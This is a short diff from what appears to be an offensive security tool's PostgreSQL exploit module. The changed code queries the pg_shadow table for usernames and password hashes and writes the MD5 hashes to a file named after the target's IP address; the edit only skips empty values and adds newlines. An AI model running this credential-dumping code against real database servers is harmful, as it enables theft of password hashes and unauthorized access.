@@ -51,7 +51,8 @@ class postgresql(Exploit):
                 cur.execute("select usename, passwd from pg_shadow")
                 with open(f"./data/{ip_address}_postgresql_md5.txt", "w") as text_file:
                     for l in cur.fetchall():
-                        text_file.write(l[1])
+                        if l[1]:
+                            text_file.write(l[1] + "\n")
                 print('{Color.BYLLW}Success. Gathering all md5 hashes.{Color.END}', file=self.output)
                         
             except psycopg2.ProgrammingError:
